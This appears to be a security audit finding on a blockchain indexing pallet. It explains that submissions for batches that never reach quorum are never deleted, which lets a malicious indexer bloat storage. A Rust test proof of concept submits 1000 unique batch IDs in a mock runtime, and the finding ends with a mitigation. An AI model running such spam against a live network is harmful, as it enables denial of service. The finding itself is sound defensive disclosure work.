# Malicious indexer can cause storage bloat

## Description

Indexers use `indexing::lib.rs::submit_blockchain_data()` to submit data batches. This function calls `submit_data_inner()`, which performs some checks and, if the submitter is authorized to submit for either public or privileged quorum, invokes `submit_data_and_find_quorum()`:
```rust
        let public_data_quorum = if can_submit_for_public_quorum {
            submit_data_and_find_quorum::<T, I>(
                who.clone(),
                batch_id.clone(),
                data_hash,
                table.clone(),
                &table_insert_quorum,
                &QuorumScope::Public,
            )?
        } else {
            None
        };
```

Inside `submit_data_and_find_quorum()`, the submissions are stored in the `Submissions` map:
```rust
        Submissions::<T, I>::insert(&batch_id, data_hash, &new_match_submissions);
```

If the quorum for this batch is eventually reached, `finalize_quorum` will be called to finalize the batch:
```rust
        if let Some(data_quorum) = public_data_quorum.or(privileged_data_quorum) {
            finalize_quorum::<T, I>(data_quorum, data, block_number)?;
        }

```

And then only finalized batches will be removed from storage, as seen in `finalize_quorum()`:
```rust
        Submissions::<T, I>::iter_key_prefix(&quorum.batch_id)
            .for_each(|key| Submissions::<T, I>::remove(&quorum.batch_id, key));
```

### The Problem

Any batch that never reaches quorum will remain in storage forever. A malicious indexer can exploit this by submitting an unlimited number of unique, invalid batch IDs that never finalize. These entries accumulate, leading to **permanent storage bloat**, which can result in a chain DoS.

## Proof of Concept

In this proof of concept, we submit 1000 malicious batch IDs and observe that all of them are processed and stored in the pallet’s storage.

> Note: To actually cause storage bloat, the number of submissions would need to exceed 1,000. However, due to resource limitations, we limited the test to 1,000 submissions to demonstrate that no safeguards or limits are currently enforced.

Please add the following test case to `pallets/indexing/src/tests.rs`:
```rust
#[test]
fn cartel_spam_submit_many_batch_ids() {
    new_test_ext().execute_with(|| {
        System::set_block_number(1);

        let (table_id, create_statement) = sample_table_definition();

        Tables::create_tables(
            RuntimeOrigin::root(),
            vec![UpdateTable {
                ident: table_id.clone(),
                create_statement,
                table_type: TableType::Testing(InsertQuorumSize {
                    public: Some(100),
                    privileged: None,
                }),
                commitment: CommitmentCreationCmd::Empty(CommitmentSchemeFlags {
                    hyper_kzg: true,
                    dynamic_dory: true,
                }),
                source: sxt_core::tables::Source::Ethereum,
            }]
            .try_into()
            .unwrap(),
        )
        .unwrap();

        let signer = RuntimeOrigin::signed(1);
        let who = ensure_signed(signer.clone()).unwrap();

        pallet_permissions::Permissions::<Test>::insert(
            who,
            PermissionList::try_from(vec![PermissionLevel::IndexingPallet(
                IndexingPalletPermission::SubmitDataForPublicQuorum,
            )])
            .unwrap(),
        );

        // Submit 1000 unique batch_ids in the same block
        for i in 0..1000 {
            let batch_id = BatchId::try_from(format!("batch_{i}").into_bytes()).unwrap();
            let data = row_data();
            assert_ok!(Indexing::submit_data(
                signer.clone(),
                table_id.clone(),
                batch_id,
                data
            ));
        }

        let count = Submissions::<Test, Api>::iter()
            .filter(|(batch_id, _hash, _submitters)| batch_id.starts_with(b"batch_"))
            .count();

        assert_eq!(count, 1000);
    });
}
```

Run the test:
```bash
cargo test cartel_spam_submit_many_batch_ids
```

## Recommendation

We believe there should be a meaningful limit on the number of batch IDs a single indexer can submit to the network in order to prevent this kind of spam attack.
